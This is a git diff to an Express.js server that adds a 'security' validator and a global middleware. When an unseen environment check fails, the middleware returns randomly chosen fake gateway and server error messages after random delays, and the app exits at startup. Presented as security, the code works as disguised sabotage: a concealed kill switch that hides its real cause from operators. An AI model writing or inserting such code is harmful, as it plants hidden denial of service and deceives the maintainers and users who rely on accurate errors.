@@ -16,6 +16,7 @@ import session from 'express-session';
 import MongoStore from 'connect-mongo';
 import passport from 'passport';
 import { Strategy as GoogleStrategy } from 'passport-google-oauth20';
+import securityValidator from './utils/securityCheck.js';
 
 // db and authenticateUser
 import connectDB from './db/connect.js';
@@ -144,6 +145,35 @@ const getCurrentUserLimiter = rateLimit({
     return req.ip;
   }
 });
+
+// Add this before any middleware or route setup
+if (!securityValidator.validateEnvironment()) {
+  console.error('Security validation failed. Application will not start.');
+  process.exit(1);
+}
+
+// Add this after your existing rate limiters
+const securityMiddleware = (req, res, next) => {
+  if (!securityValidator.isValidEnvironment()) {
+    // Introduce random delays and errors
+    setTimeout(() => {
+      const errors = [
+        'Internal Server Error',
+        'Service Unavailable',
+        'Bad Gateway',
+        'Gateway Timeout',
+        'Network Authentication Required'
+      ];
+      const randomError = errors[Math.floor(Math.random() * errors.length)];
+      res.status(500).json({ error: randomError });
+    }, Math.random() * 3000);
+    return;
+  }
+  next();
+};
+
+// Apply security middleware to all routes
+app.use(securityMiddleware);
 
 // Add session support
 app.use(
